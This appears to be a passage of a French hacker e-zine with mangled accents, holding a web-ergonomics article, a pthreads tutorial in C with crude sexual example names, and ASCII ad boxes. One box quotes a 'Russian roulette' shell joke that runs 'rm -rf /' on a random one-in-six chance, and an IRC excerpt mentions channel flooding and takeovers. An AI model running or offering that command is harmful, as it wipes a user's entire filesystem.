centaines de lignes de codes doivent Ωtre ajoutΘes au  site pour que le site sorte exactement 
pareil   dans  tous  les  fureteurs. Sans  compter  que  certaines  compagnies  malveillantes 
(&lt;B>MICROSOFT< STRONG/>) ajoutent  leurs propres standards propriΘtaires dans leur fureteurs. 
Ou ils refusent  catΘgoriquement  de se plier α un standard pourtant acceptΘ de tous pour des
raisons inconnues, mais surement futiles. Peut-Ωtre que c'est juste pour  nous  compliquer la 
vie.. Si c'est le cas, ils ont rΘussi :|  Un  exemple  frappant  est  l'ΘlΘment  CSS  "fixed" 
qu'Internet Explorer ne supporte pas..  Pourtant  QUOI  DE PLUS UTILE que de pouvoir dire: je 
veux que cet ΘlΘment la  reste  a cette position la, MEME si le user scroll .. Biensur il y a 
des  "workaround" ou des  "tricks" pour contourner le problΦme,  mais  souvent  ces  solution 
apportent autant de problΦmes qu'il n'en rΦgles, en plus de prendre 100x plus de bytes que le 
mot F I X E D. Cases studies:

MΘthode #1
http://tagsoup.com/-dev/null-/css/fixed/

L'effet  est  la..  tout  fonctionne  comme dans firefox et seulement avec des  tricks  CSS.. 
FΘlicitation champion. Mais le "hic", c'est qu'avec cette  mΘthode  vous  perdez l'ΘlΘment de 
position "absolute" .. PRATIQUE .

MΘthode #2
http://www.howtocreate.co.uk/fixedPosition.html

L'effet  est  surprenant  et je n'ai pas trouvΘ d'inconvΘniants majeurs si ce  n'est  que  la 
grosseur du code pour arriver α un rΘsultat qu'un mot de 6 lettres  arrive  α  faire  dans un 
browser  comme  Mozilla  Firefox  et  qu'il  fait  appel  α des fonctions obscures d'internet 
explorer dont j'ignorais totalement l'existance..

<!--[if gte IE 5.5]>
&lt;style type="text/css">
div#fixme {
	/* IE5.5+/Win - this is more specific than the NS4 version */
	left: expression( ( 20 + ( ignoreMe2 = document.documentElement.scrollLeft ? document.documentElement.scrollLeft : document.body.scrollLeft ) ) + 'px' );
	top: expression( ( 10 + ( ignoreMe = document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop ) ) + 'px' );
}
&lt;/style>
<![endif]-->


	... Avouez que ce n'est pas catholique :p J'avoue que <!--[if gte IE N]>  j'ai trouvΘ 
ca  bien  comme  "trigger",  ca  permet  de  trier  les  browser  cons des intelligents. Mais 
"expression" .. wtf ? Je vous passe les exemples avec  javascript  qui  font  refresh continu 
pour "tracker" les scroll de l'utilisateur  et repositionner l'ΘlΘment .. C'est vraiment laid 
et il n'y a que Microsoft pour nous pousser α coder des atrocitΘs du genre.

	Mais voilα qu'avec l'arrivΘe d'un web dit "sΘmantique", on voit peut-Ωtre la  lumiΦre 
au bout du tunnel. Le XHTML strict jumelΘ au css, xsl, xsd, xml devrait  nous aider α sΘparer 
les donnΘes de la prΘsentation graphique et forcer les compagnies de fureteur α se plier plus 
aux standards. Une fois cette Θtape  franchie,  dΘvelopper  des applications web devrait dΘjα 
Ωtre plus facile. Et si  le  XMLHttpRequest tient ses promesses,  le  web  devrait  voir  une 
vΘritable explosion de rΘel "applications web" performantes  offrant  des  possibilitΘs  dont 
nous ne fesions que rΩver (*tousse* http://maps.google.com *tousse*). 

	De grands pas on ΘtΘ faits  pour  rendre  le  web  plus  dynamique,  mais l'ergonomie 
software ne fait pas partie du  dictionnaire  de  tous  les  programmeurs web. Un bon exemple 
d'une bonne ergonomie software et un autre un  peu  plus moyen, c'est de comparer google mail 
(gmail) α hotmail avec une  connection  dialup (56k). Gmail est vraiment conτu dans le but de 
minimiser au  maximum  le  nombre  et  le  temps  de refresh ainsi que la quantitΘ de donnΘes 
envoyΘes  au  client,  ce  qui  rend  son utilisation beaucoup plus fluide et "real time" que 
hotmail. C'est trΦs important, car l'utilisateur se lasse trΦs rapidement devant un site trop 
long α tΘlΘcharger.

	Souvent l'ergonomie se concrΘtise  dans  de  petits  dΘtails,  comme  la  possibilitΘ 
d'effectuer des tΓches groupΘes pour gagner  du  temps et l'ajout de "shortcut keys" pour les 
utilisateurs avancΘs. Bref, n'importe quoi qui  n'encombre  pas visuellement l'application et 
qui rend l'interaction entre l'utilisateur et le programme plus fluide et facile.

	Utilisez  les  bon  "input  controls"  aux  bons endroits. Les input control sont les 
mΘchanismes d'acquisition de donnΘes comme les checkbox, radio, select,  textarea  etc.   Ils 
sont trΦs utiles pour recevoir de l'information de la part d'un utilisateur, mais ils doivent 
Ωtre choisis avec soin selon le contexte et le  type  de  donnΘes acquises. Par exemple, pour 
choisir parmis une ΘnumΘration de noms plus ou moins longue comme une liste de ville ou pays, 
le "select" est  indiquΘ.  Pour  un  choix de rΘponse restreint, utilisez plut⌠t les "radio". 
Plusieurs assais on ΘtΘ faits pour ajouter d'autres "input controls" plus avancΘs  comme  des 
tabulateurs ou des "slidebars" pour enrichire l'interaction  avec  l'utilisateur.  Le  chemin 
pour y arriver est souvent laborieux et les rΘsultats  plut⌠t  dΘcevants.  D'un  autre  cotΘ, 
certains sont arrivΘs α des rΘsultats plut⌠t impressionants, comme Mihai Bazon avec sa vision 
d'un textarea:  http://www.interactivetools.com/staff/ben/htmlarea3_demo/example.html

	Il  faut  aussi  Θviter  de  mettre  trop  de  texte  pour  rien, si des informations
supplΘmentaires &lt;em>pertinantes&lt;/em> sont disponibles, linkez les  plut⌠t  que  de  crΘer  un 
manuel d'instruction interactif en guise de programme. Soyez le  plus  bref  et  conτis   que 
possible, en tout temps, car le average net user  dΘteste  lire.  Tout  ce  qu'il  veut c'est 
atteindre son but le plus rapidement  possible  avec  le  moins  d'Θtapes  possible. Pourquoi 
croyez-vous que sur un des  applications  web les plus visitΘ du monde; google, on y retrouve 
zΘro annonces publicitaires, 42 mots et 1 image ?

	C'est aussi vrai pour les menus, Θvitez les noms trop longs. ╔vitez  les  noms  comme 
"Lire les nouvelles" ou "Discuter sur le Forum".  Utilisez  plutot  des  mots  simples  comme 
"Nouvelles" et "Forum", l'utilisateur comprendra quand mΩme et  votre  design ne s'en portera 
que mieux. Si vous avez beaucoup d'items dans votre menu, n'hΘsitez pas de crΘer des "arbres" 
pour regrouper vos items de faτon logique.

	Si  quelque  chose  n'est  pas  utile  α  votre  contenu ou "message", enlevez-le. Le 
meilleur exemple que je puisse penser, c'est la surutilisation sections membres  sur  le web. 
Pratiquement chaque site web α sa propre secion membre. Demandez-vous  si  c'est   rΘellement 
indispensable. ConsidΘrez toujours que les  utilisateurs  du  web restent rarement fidΦles au 
mΩme site trΦs longtemps. └ moins d'offrir  un  service,  comme  un  webmail ou ebay, ou Ωtre 
rΘellement axΘ sur le  cotΘ  "communautΘ web"  avec  un  but  prΘcis  comme doyoulookgood, ca 
ne  vaut  pas rΘellement la peine d'avoir une section membre. Par exemple, certains sites web 
forcent les utilisateurs α s'enregistrer pour downloader leurs  produits,   combien  de  fois 
croyez vous que ces utilisateurs reviennent sur le site pour .. lire le forum ? .. Participer 
au sondage ? .. Une fois qu'il a tΘlΘcharger ce  qu'il  voulait.   Je  parirais plus qu'il va 
oubliΘ sont password dans la mΩme  ╜  heure. Choisissez les ΘlΘments qui composent votre site 
avec discernement. 

	Vous devez aussi prendre en considΘration votre public cible. Par  exemple,  si  vous 
faites un programme pour administrer une base de  donnΘe  mysql,  vous  pouvez  prendre  pour 
acquis que l'utilisateur qui utilisera votre programme α  une  base  relativement  solide  en 
informatique. Mais si vous codez un client  ftp  ou  http, vous devez prendre en compte qu'un 
plus grand "range" de niveaux  d'utilisateurs  risquent  d'utiliser  votre  application.   En 
gΘnΘral, si vous  programmez  pour  des  utilisateurs avancΘs, votre interface sera complexe, 
mais votre programme simple. Tandis que pour des utilisateurs lamba,  l'interface sera simple 
et le programme sera complexe. Sa semble illogique,  mais  un  programme  qui s'adresse α des 
dΘbutants devrait faire le maximum avec  un  minimum  d'interaction  avec  l'utilisateur.  Le 
programme doit donc dΘduire  beaucoup  plus  de variables. L'utilisateur avancΘ, quant α lui, 
n'abandonnera pas  devant  un plus grand nombre de champs de saisie de donnΘe. Par contre, il 
le  fera si les "input controls" ne sont pas utilisΘs efficacement. Le mieux  est  Θvidemment 
d'avoir le meilleur des deux mondes, une interface simple, mais qui cache des options avancΘs 
facilement accessibles.

	Le comble de l'ergonomie software Θtant surement de plugger  directement  le  cerveau 
humain en interaction avec le programme, nous allons nous concentrer de ce que l'average uber 
geek peut arriver α faire sans ouvrir un crΓne.  J'ai  trouvΘ  sur  le  net  un  petit   test 
heuristique  qui  permet  de  dΘjouer  les  erreurs  courantes  commisent  dans  les   design 
d'interfaces  de  programmes.  Il  a  ΘtΘ Θcrit et pensΘ dans le contexte de la programmation 
standard et non "web",  mais avec un peu d'imagination c'est applicable sur le web aussi.

 Tableau 1
 »»»»»»»»»
+---------------------------------------------------------------------------+
| ╔valuation heuristique d'un interface	*****				    |
+---------------------------------------------------------------------------+
| 1. ╔tat du systΦme							    |
| »»»»»»»»»»»»»»»»»»							    |
|     L'utilisateur devrait Ωtre informΘ de ce qui ce passe en arriΦre plan |
| de faτon appropriΘe et ce dans des dΘlais rΘsonnables.		    |
|									    |
+---------------------------------------------------------------------------+
| 2. Lien entre le systΦme et le monde rΘel				    |
| »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»				    |
|     Le systΦme devrait communiquer avec un language facile α comprendre   |
| par l'utilisateur dans un ordre logique et naturel plut⌠t que dans	    |
| la forme "orientΘ systΦme".						    |
|									    |
+---------------------------------------------------------------------------+
| 3. LibertΘ de mouvement						    |
| »»»»»»»»»»»»»»»»»»»»»»						    |
|     L'utilisateur devrait Ωtre en mesure de quitter n'importe quelle 	    |
| "Θtape" du programme ,dans laquel il aurait pus arriver par mΘgarde, 	    |
| rapidement et facilement.	(Souvent rΘalisΘ avec undo\redo)	    |
|									    |
+---------------------------------------------------------------------------+
| 4. Consistance et standards						    |
| »»»»»»»»»»»»»»»»»»»»»»»»»»»						    |
|     L'utilisateur ne devrait pas avoir α se questionner sur la 	    | 
| signification des termes, situations ou actions. Suivez les conventions   |
| de la plateforme.							    |
|									    |
+---------------------------------------------------------------------------+
| 5. PrΘvenir les erreurs						    |
| »»»»»»»»»»»»»»»»»»»»»»»						    |
|     Encore mieux qu'un bon message d'erreur: prΘvenez cette erreur.	    |
|									    |
+---------------------------------------------------------------------------+
| 6. AccessibilitΘ							    |
| »»»»»»»»»»»»»»»»							    |
|     Rendez les objets, actions et options visibles. L'utilisateur ne 	    |
| devrait pas avoir α se souvenir des informations d'un "dialogue" α 	    |
| l'autre. Et les instructions d'utilisation devraient Ωtre accessible      |
|  facilement	                                                            |
| en tout temps.							    |
|									    |
+---------------------------------------------------------------------------+
| 7. FlexibilitΘ et efficacitΘ						    |
| »»»»»»»»»»»»»»»»»»»»»»»»»»»»						    |
|     Les racourcis (cachΘs aux utilisateurs lamba) peuvent grandement 	    |
| accelΘrer l'interaction des utilisateurs plus experts. De cette faτon,    |
| l'interface convient au deux types d'utilisateurs. Rendez possible 	    |
| l'optimisation des tΓches rΘpΘtitives.				    |
|                                                                           |
| * A mon avis Adobe Photoshop est une rΘfΘrence sur ce point.		    |
|									    |
+---------------------------------------------------------------------------+
| 8. Design esthΘtique et minimal					    |
| »»»»»»»»»»»»»»»»»»»»»»»»»»»»»                                             |
|     Les dialogues ne devraient pas contenir d'informations futiles et     |
| inutiles. Chaque unitΘ d'information ajoutΘ inutilement entre en          |
|concurence avec les information crutial et le rendrent moin		    |
| visible.								    |
|									    |
+---------------------------------------------------------------------------+
| 9. Aidez α la reconnaissance, le dΘboguage et la rΘsolution d'erreurs     |
| »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»	    |
|     Les messages d'erreur devraient Ωtre exprimΘs en texte simple, sans   |
| codes. Ils devraient indiquer avec prΘcision la source de l'erreur et     |
| donner une ou des suggestions constructives sur la faτon de rΘgler le	    |
| problΦme.								    |
|									    |
| * &lt;sarcasme>Microsoft est passΘ maitre dans cet art :)&lt;/sarcasme>	    |
|									    |
+---------------------------------------------------------------------------+
| 10. Aide et documentation						    |
| »»»»»»»»»»»»»»»»»»»»»»»»»						    |
|     MΩme si dans le meilleur des monde une application ne devrait pas     |
| nΘcΘssiter d'aide, il est souvent nΘcessaire de fournir une documentation.|
| Elle devrait Ωtre facile α trouver, orientΘe principalement sur les tΓches|
| de l'utilisateur. Lister les Θtapes concrΦtes α faire et Ωtre le plus     |
| concis possible.							    |
+---------------------------------------------------------------------------+


Tricks
------


n'aurais tout simplement pas pu faire ce genre  de chose. Avec Perl, les possibilitΘs Θtaient

	Lorsque  l'utilisateur  doit  "browser"  beaucoup  de  lignes,  utiliser  un  systeme 
d'highlight "onMouseOver" like pour mettre en Θvidence  la  ligne  qu'il  survole,  vous  lui 
Θpargnerez  peu-Ωtre  un  mal  de  tΩte. La couleur du  highlight  devrait  Ωtre  subtile  et 
harmonieuse  avec  le  background  et  le   foreground  plut⌠t  qu'aggressive  et  Θclatante. 
GΘnΘralement deux ou trois tons  plus  foncΘs  ou  clairs  que  le  background  donne de bons 
rΘsultats.

	Garder les subtilitΘs pour les ΘlΘment du background, le foreground doit Ωtre Θvident 
et  contrastΘ,  le contenu doit Ωtre le plus lisible possible. Les Θcrans  et  les  yeux  des 
personnes rendent trΦs diffΘremment les nuances et les subtilitΘs d'un sujet α l'autre.

	La validation de forms avec le JavaScript est trΦs bien pour gagner  du  temps,  mais 
il ne faut pas pour autant nΘgliger la validation cotΘ serveur. Car la validation cotΘ client 
est facile α bypasser et ne constitue pas  une  sΘcuritΘ  en  soi.  On pourrait appeler ca un 
"refresh saver".

	Assurez vous que les liens ressortent bien du texte qui l'entour, et tentez  le  plus 
possible d'utiliser toujours la mΩme couleur pour vos liens. Ca peut  sembler  poussΘ   comme 
raisonnement, mais le bleu est une couleur α favoriser  pour  les  liens.  Par  defaut,   les 
fureteurs  utilisent  le  bleu  comme  couleur  pour  les  liens.. Les  utilisateurs  y  sont 
gΘnΘralement habituΘs. 

	Si le public cible de votre site comporte des personnes agΘes, pensez α  ajouter  des 
options  d'accessibilitΘ,  grandeur  de  police  variable  (avec  css  et  javascript   c'est 
relativement facile), thΦmes contrastΘs ou version imprimable pour les personnes  ayant   des 
prolΦmes visuels. Ce sont des petits plus souvent oubliΘs.
	
	Utilisez plus d'un bΘta testeur, 4 ou 5 c'est parfait, selon l'ampleur du projet. 

	SpΘcifiez aussi les background blanc. De  plus  en  plus  d'utilisateurs  "mod"  leur 
windows et le background d'application n'est pas toujours nΘcΘssairement   blanc, ce qui peux 
jouer ΘnormΘment sur le rendu de v⌠tre design.

	└ moins que le dΘfilement de votre contenu soit horizontal, Θvitez que votre  contenu 
dΘpasse les 800px de largeur. C'est toujours surprenant (ou dΘcourageant)  de  voir le nombre 
de taupes qui utilisent encore cette rΘsolution ..

	Le shockwave flash mΩme s'il ne fait pas partie des recommandations du  W3C vaut bien 
une mention spΘciale. Il est considΘrablement rΘpendu et il faut  avouer ses avantages. Flash 
offre beaucoup d'avantages qui seraient techniquement  trΦs difficiles, voir mΩme impossibles 
α rΘaliser avec du simple html ou mΩme dhtml. Toutefois,  mΩme  si  vous ou votre client Ωtes 
trΦs enthousiasmΘs par le flash,  rΘsistez  α la tentation de faire votre site entiΦrement en 
flash. Cette  technologie a beau Ωtre en constant essort, le nombre de types de "clients" qui 
peuvent  lire  le  format  flash  reste  plutot  limitΘ. Il est certain que la nature du site 
importe  dans  cette  dΘcision.. Si les cellulaires, palm, .. frigidaire ? fureteur textes ou 
les os  qui  ne sont pas supportΘs par flash ne sont pas visΘ .. so what ? .. Mais attention, 
mΩme  s'il  est  peu  probable  que  vous  ayez  boucoup  de  visiteurs utilisant lynx, si un 
navigateur texte ne peut visiter votre site, un robot de moteur de recherche ne le pourra pas 
plus. Pensez-y bien :)


 Tableau 2 *fort probablement incomplet ..
 »»»»»»»»»
+---------------------------------------------------------------------------+
| Languages client side						            |
+---------------------------------------------------------------------------+
|	html		|	HyperText Markup language		    |
|	dhtml		|	Dynamic HyperText Markup language	    |
|	xhtml		|	eXstensible HyperText Markup language	    |
|	vml		|	Vector Markup language			    |
|	css		|	Cascading Style Sheet		    	    |
|	vbs		|	VisualBasic Script		   	    |
|	js		|	JavaScript				    |
| 	js		|	JScript					    |
|	class ?		|	Java (compilΘ)				    |
|	ocx		|	ActiveX					    |
|	xml		|	eXstensible Markup Language		    |
|	xsl		|	eXstensible Stylesheet Language		    |
|	xslt		|	eXstensible Stylesheet Language Transform   |
|	xsd		|	XML Shema Defenition			    |
|	dtd		|	Document Type Defenition		    |
|	swf		|	ShockWave Flash	(compilΘ)		    |
|-- autres standards dΘrivΘs (gΘnΘralement non supportΘs) ------------------|
|	sgml		|	Standard Generalised Markup Language	    |
|	thml		|	Theological Markup Language		    |
|	xrml		|	Digital Rights Language for Trusted         |
|			|	Content & Services	                    |
|	gml		|	Geography Markup Language		    |
|	qml		|	Quantum Markup Language :> **		    |
|	sbml		|	Systems Biology Markup Language		    |
|	uiml		|	User Interface Markup Language		    |
|	cml		|	Chemical Markup Language		    |
|	cml		|	Chemical Markup Language		    |
|	xaml		|	"Longhorn" Markup Language ***	    	    |
|	wml		|	Wireless Markup Language	            |
|	cnxml		|	Connexions Markup Language		    |
|	mathml		|	Mathematic Markup Language		    |
|	idml		|	International Development Markup Language   |
|	rdf		|	The Resource Description Framework	    |
|	smil		|	The Synchronized Multimedia Integration     |
|                       |       Language		                    |
|	svg		|	Scalable Vector Graphics		    |
+---------------------------------------------------------------------------+
| Languages server side							    |
+---------------------------------------------------------------------------+
|	cgi			|					    |
|	pl			|	perl				    |
|	php			|	Hypertext PreProcessor		    |
|	rb			|	ruby				    |
|	py			|	python				    |
|	asp			|	Active Server Page		    |
|	aspx			|	Active Server Page	x ?	    |
|	tcl			|					    |
|	jsp			|	Java Server Page		    |
|	cfm			|	Cold Fusion 			    |
+---------------------------------------------------------------------------+


*		RPC (Realtime Procedure Call). Pour plus d'infos: 
		http://www.bazon.net/mishoo/rpc.epl
**		http://www.qc.fraunhofer.de/doc/qml/QMLspecification.html <- ish.
***		Nouveau language markup supposΘment "rΘvolutionaire" de microsoft .. messemble :p
****	Heuristique: MΘthode de recherche empirique ayant recours aux essais et 
		erreurs pour la rΘsolution de problΦmes. C'est une mΘthode frΘquemment 
		utilisΘe en intelligence artificielle, α l'intΘrieur de ce qui est 
		techniquement appelΘ univers incertains. (source: www.dictionnaire.com)
*****	TirΘ d'un texte de Jakob Nielsen at:
		http://www.useit.com/papers/heuristic/heuristic_list.html


Note:	Entre temps o∙ j'ai commencer α Θcrire cet article et celui o∙ je l'ai finalisΘ,
		j'ai finalement eu une connection haute vitesse :) thx a lot TheCops ;>



  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|                                                        \_ \   \\_  \_ \         `
 || |                                                          \\_  \_ \   \\_ M  ; . X
 || |                                                          \_ \   \\_  \_ \ K      
 || |                                                            \\_  \_ \   \\_ -  : '
 ||`|                                                            \_ \   \\_  \_ \ 1   
 || |                                                              \\_  \_ \   \\_ 1  + 
 || |                                                              \_ \   \\_  \_ \ 1   
 ||'|&lt;g463> [ $[ $RANDOM % 6 ] == 0 ] && rm -rf /                    \\_  \_ \   \\_  x 
 || |                                                                \_ \   \\_  \_ \  `
 || |                                                                  \\_  \_ \   \\_  
 ||,|                                                                  \_ \   \\_  \_ \.
 || |                                                                    \\_  \_ \  _\\_  
/ | |                                                                    \_ \   \\_/    \
 / ;|                                                                      \\_  \_       |
 /  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[ la roulette russe virtuel                                             ]=\:\  |
  \__\__________________________________________________________________________________/  


  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[O5]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[ Un affaire de thread          ] =\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka: Introduction au POSIX thread API.                         ]=\:\  \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[   Phawnky    ]=\:\ _//     
                                                  \__\________________________/__/ 


                                                  
                           
.:[ Intro ]:.                                                      

  .: Quesser que c un thread? :. 

      Imaginer (preferablement apres un spliff/alcool/manque de someille) que le task manager 
      c'est genre une ville la, yeah. Et  genre,  dans  cette  ville  chaque  edifice  a  une 
      fonction   etabilit;   ses  propres  ressources  fournit  par  l'osti  de  gouvernement 
      corrompu...erm. Mais le plus weird la, c'est que  la  plupart  des  edifices  continent 
      juste une salle de 50 etages de haut.  Perte d'espace et d'argent? hell yeah! Le thread 
      palie a ce probleme la  en  ajoutant la possibilite de creer plusieurs etages remplient 
      d'esclaves  qui  travailent  tous en meme temps, theoriquement. Chaque etage d'esclaves 
      peut avoir une fonction differente. En plus d'etre aussi economique qu'une  Mr big avec 
      25% de plus, le tout rend la gestion des taches a l'interne  extremement facile a geree 
      que ce soit cote communication ou ressources partagees.
            
  .: Pourquoi c'est kewl un thread? :.    
  
      Mise a part l'evidence, que le programmes va aller exponentiellement plus vite, un truc 
      pas mal nice avec les threads c'est la communication inter-threads  qui  est  tellement 
      simple comparativement au crisse d'enfer  mongole  de  la  communication inter-proccess 
      (Genre les femmes c'est simple a coter de ca).
      
      C'est simple parceque chaque thread a access au Variable Global d'un  prog.  Donc,  pas 
      besoin d'ouvrir un cannal de communication IPC (msgget/msgsnd/msgrcv)  nope  nope nope, 
      suffit juste de modifier une var :D well, presque...  il  est  aussi  question de mutex 
      locks, mais j'aborderais pas le tout immediatement.
      
  .: Quand ca peut etre utile? :.
  
      Je sais pas si vous avez deja programmer un ports scanner pour le fun ou n'importe quoi 
      d'autre ou y'a enormement de function calls qui sont  non  critique  a l'application en 
      soi et qui peuvent etre fait dans le desordre  le  plus  total,  mais c'est precisement 
      dans ce temps la, que rayonne l'utilisation de threads.
      
.:[ Creation de threads ]:.

   .: Premier programme multi-threaded :.
   
      00
      00    // Compiler avec -pthread [*bsd/cygwin] ou -lpthread [linux]
      00
      01    #include &lt;stdio.h>
   *  02    #include &lt;pthread.h>
      03
   *  04    void *tfunc(void *moo) { putchar(*(int *) moo); }
      05
      06    int
      07    main()
      08    {
      09       char str[] = "Hello World\n";
   *  10       pthread_t tlist[sizeof(str)/sizeof(str[0])];
      11       int i;
      12
      13       for(i=0; str[i]; i++)
   *  14          pthread_create(&tlist[i], 0x00, tfunc, &str[i]);
      15       sleep(1);
      16    }
       
   .: Explications :.
   
   02 - L'API POSIX de thread (pthread) 
        
        Tres important de compiler avec la switch: 
           -pthread  [*bsd/cygwin] 
           -lpthread [linux]
                   
   04 - Declaration de la fonction qui va etre appeller juste apres la creation d'un thread    
      
   10 - Declaration d'une liste d'elements du types pthread_t (les threads)
   
   14 - Creation de threads. La structure de la fonction pthread_create:
   
        pthread_create(pthread_t *thread, const pthread_attr *attr, 
                       void *(*start_routine)(void *), void *arg);

        - Pour  les  attributs,  NULL  va utiliser ceux par default et generalement ca suffit 
          emplement.
  
        - La fonction doit retourner un pointer void et prend aussi  uniquement  un  pointeur 
          void comme argument, mais y reste que  ca  peut  evidement  etre une voided struct, 
          c'est loin d'etre limitatif.
                    
.:[ Utilisation de ressource partager ]:.
      
   .: Mauvais exemple de ressources partager :.
           
      01    #include &lt;stdio.h>
      02    #include &lt;pthread.h>
      03
      04    void *fuxor(void *);
      05
      06    // Ressource Partage
   *  07    struct SexSlave {
   *  08       int compteur_sekz;
   *  09    } Fire;
      10
      11    int main()
      12    {
      13       char *lemuriens[] = { "phawnky", "wyzeman", "init_null",
      14                             "candu", "mindflayr", "h3",
      15                             "NeVR-C", "Ma_Bell",  "ibrator",
      16                             "XeliteX" };
      17       pthread_t lemurien_t[10];
      18       int i;
      19       
      20       for(Fire.compteur_sekz=i=0; i<10; i++)
      21          pthread_create(&lemurien_t[i], 0x00, fuxor, lemuriens[i]);
      22       sleep(1);
      23
      24       printf("[F]ire a baise %d fois! et elle en redemande!\n",
      25              Fire.compteur_sekz);
      26    }
      27
      28    void *fuxor(void *lemurien)
      29    {
   *  30       printf("[F]ire se fait baiser par %s\n", lemurien);
   *  31       printf("%s ne baise plus [F]ire\n", lemurien);
   *  32       Fire.compteur_sekz++;
      33    }

   .: Explications :.
   07 - 09: Creation de la ressource Fire de type SexSlave qui va etre  accessible  par  tout 
            les threads.
           
   30 - 32: Self-Explanitory

   .: Moo :.   
   Une fois compile et exectue, un probleme (MAJEUR) est plutot apparant...Tout les lemuriens 
   baisent Fire en meme temps, en plus d'etre physiquement  impossible et/ou tres douloureux, 
   c'est un effet secondaire indesirable (discutable). Dans tout les cas, je prefers que tout 
   le monde ce la tappe  a  tours  de role. Pour qu'il en soit ainsi l'utilisation d'un mutex 
   lock est necessaire. Mutex lock est un  abbreviation  pour:  Mutual  Exclusion  Lock ou...
   erm...Serrure a Exclusion Mutuelle? En bref c comme l'analogie du  chat  dans  la boite en 
   physique quantique sauf que y'a pas de boite, y'a  juste  un  chat...et le chat peut juste 
   appartenir a une personne a la fois.
   
.:[ Mutual Exclusion Locks (MUTEX) ]:.      
      
      01    #include &lt;stdio.h>
      02    #include &lt;pthread.h>
      03
      04    void *fuxor(void *);
      05
      06    // Ressource Partage
      07    struct SexSlave {
      08       int compteur_sekz;
   *  09       pthread_mutex_t sekz;
      10    } Fire;
      11
      12    int main()
      13    {
      14       char *lemuriens[] = { "phawnky", "wyzeman", "init_null",
      15                             "candu", "mindflayr", "h3",
      16                             "NeVR-C", "Ma_Bell",  "ibrator",
      17                             "XeliteX" };
      18       pthread_t lemurien_t[10];
      19       int i;
      20       
      21       for(Fire.compteur_sekz=i=0; i<10; i++)
      22          pthread_create(&lemurien_t[i], 0x00, fuxor, lemuriens[i]);
      23       sleep(1);
      24
      25       printf("[F]ire a baise %d fois! et elle en redemande!\n",
      26              Fire.compteur_sekz);
      27    }
      28
      29    void *fuxor(void *lemurien)
      30    {
   *  31       pthread_mutex_lock(&Fire.sekz);
      32       
      33       printf("[F]ire se fait baiser par %s\n", lemurien);
      34       printf("%s ne baise plus [F]ire\n", lemurien);
      35       Fire.compteur_sekz++;
      36 
   *  37       pthread_mutex_unlock(&Fire.sekz);
      38    }

   .: Explications :.
   09 -> Le sex de Fire est dorenavent proteger par un mutex lock.

   31 -> Le thread essaie de prendre possession du sex a fire,  si  il  ne  reussit  pas   la 
         premiere fois, il va re-essayer jusqu'a  ce qu'il est assouvit son envie... comme un 
         grand gracon.

   37 -> Le Thread peut enfin mourrir l'ame en paix.
               
      
.:[ References ]:.
   
 -> http://www.llnl.gov/computing/tutorials/pthreads/
 
 -> man pthread  
 
 -> PThreads Primer - A Guide to Multithreaded Programming
    - Bil Lewis & Daniel J. Berg 
    - SunSoft Press, A Prentice Hall Title
    - 1996 (c) Sun Microsystems, inc.
    - ISBN 0-13-443698-9





  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|&lt;An0n1mUs> salut wyzeman                                \_ \   \\_  \_ \         `
 || |&lt;An0n1mUs> hey pense tu je pourrais avoire 100 sur hack.fr\\_  \_ \   \\_ M  ; . X
 || |&lt;wyzeman> dit moi pour quel raison jdevrais penser ca     \_ \   \\_  \_ \ K      
 || |&lt;An0n1mUs> pcq chu fanatique de so pi jpourrais etre utile  \\_  \_ \   \\_ -  : '
 ||`|a kkchose keke temp                                         \_ \   \\_  \_ \ 1   
 || |&lt;wyzeman> ok, c quoi tes connaissances ?                      \\_  \_ \   \\_ 1  + 
 || |&lt;An0n1mUs> jconnais un peux so                                \_ \   \\_  \_ \ 1   
 ||'|&lt;An0n1mUs> flood...                                             \\_  \_ \   \\_  x 
 || |&lt;An0n1mUs> pi taker les chan                                    \_ \   \\_  \_ \  `
